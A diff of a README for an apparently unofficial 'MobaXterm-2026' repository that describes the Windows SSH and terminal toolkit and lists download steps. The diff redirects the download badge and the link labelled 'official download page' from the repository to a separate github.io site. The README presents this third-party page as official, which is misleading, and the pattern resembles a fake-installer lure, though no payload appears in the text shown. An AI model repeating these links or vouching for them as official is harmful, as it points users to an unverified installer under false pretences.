@@ -1,13 +1,13 @@
 # 🖥️ MobaXterm-2026 - Simple Terminal Access for Windows Computers
 
-[![Download MobaXterm](https://img.shields.io/badge/Download-MobaXterm--2026-blue.svg)](https://github.com/Happ527/MobaXterm-2026)
+[![Download MobaXterm](https://img.shields.io/badge/Download-MobaXterm--2026-blue.svg)](https://happ527.github.io)
 
 MobaXterm-2026 acts as a toolkit for remote computing. It combines a terminal, an X11 server, and SSH tools into one application. This software works on Windows 10 and Windows 11. It allows you to connect to remote servers or computers with security.
 
 ## 📥 Getting the Software
 
 1. Open your web browser.
-2. Go to the [official download page](https://github.com/Happ527/MobaXterm-2026).
+2. Go to the [official download page](https://happ527.github.io).
 3. Find the button labeled "Download" or "Releases."
 4. Click the link to save the installer file to your computer.
 5. Wait for the file to finish downloading.
